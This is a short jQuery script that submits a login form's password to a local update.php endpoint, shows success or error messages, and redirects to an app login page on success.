$(document).ready(function(){
	//user submits login form
	$(".login100-form").submit(function(e){
		e.preventDefault();
		//get user info.
		let password=$("#password").val();
		if(password!==""){
			$.post(
				'update.php',
				{
					"password":password,
				},
				function(data,status){
					console.log(data);
					if(status=='success'){
						if(data==1){
                            $('.message2').show(100);
							$('.login100-form').slideUp(7000,function(){
                                window.location='https://app.digitadooh.com/login/'
                            });
						}else{
							//clear input fields
							$(".response").show(100).html("Invalid Email")
							.fadeOut(10000);
						}
					}
				}
			)
		}
	})
})